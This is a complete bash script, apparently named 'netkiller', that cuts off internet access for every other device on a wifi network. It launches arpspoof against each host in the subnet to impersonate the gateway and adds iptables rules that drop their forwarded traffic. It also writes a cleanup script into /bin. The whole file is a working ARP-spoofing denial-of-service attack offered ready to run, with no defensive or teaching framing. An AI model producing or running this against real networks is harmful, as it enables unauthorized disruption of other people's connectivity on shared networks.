#!/bin/bash

# Block internet for all users on wlan0 except your own IP
# Dependencies: arpspoof, iptables, ipcalc, awk

# Variables
INTERFACE="wlan0"
GATEWAY=$(ip route | grep default | awk '{print $3}')
MYIP=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
NETWORK_INFO=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}')
SUBNET=$(echo $NETWORK_INFO | cut -d/ -f2)
NETWORK=$(ipcalc -n "$NETWORK_INFO" | grep Network | awk '{print $2}' | cut -d/ -f1)

# Get all hosts in subnet except your own and the gateway
IP_LIST=$(ipcalc -b "$NETWORK/$SUBNET" | grep Hosts | awk '{print $4}' | sed 's/,//')
ALL_HOSTS=$(ipcalc -n "$NETWORK/$SUBNET" | grep HostMin | awk '{print $2}')
END_HOST=$(ipcalc -n "$NETWORK/$SUBNET" | grep HostMax | awk '{print $2}')

# Function to get all IPs in subnet
function get_all_ips() {
    IFS=. read i1 i2 i3 i4 <<<"$ALL_HOSTS"
    IFS=. read j1 j2 j3 j4 <<<"$END_HOST"
    for i in $(seq $i4 $j4); do
        echo "$i1.$i2.$i3.$i"
    done
}

# Enable IP forwarding (required for arpspoof/iptables)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Block forwarding from others
for IP in $(get_all_ips); do
    if [[ "$IP" != "$MYIP" && "$IP" != "$GATEWAY" ]]; then
        # Block this IP from forwarding to the internet
        iptables -A FORWARD -s "$IP" -j DROP
        # Start arpspoof for this IP
        arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
    fi
done

echo "Blocking all wifi clients internet on $INTERFACE except your IP $MYIP."
echo "To stop, run: netkiller-stop"

# Clean the rules
cat > /bin/netkiller-stop << EOF
iptables -F
iptables -F FORWARD
killall arpspoof
EOF
chmod 755 /bin/netkiller-stop
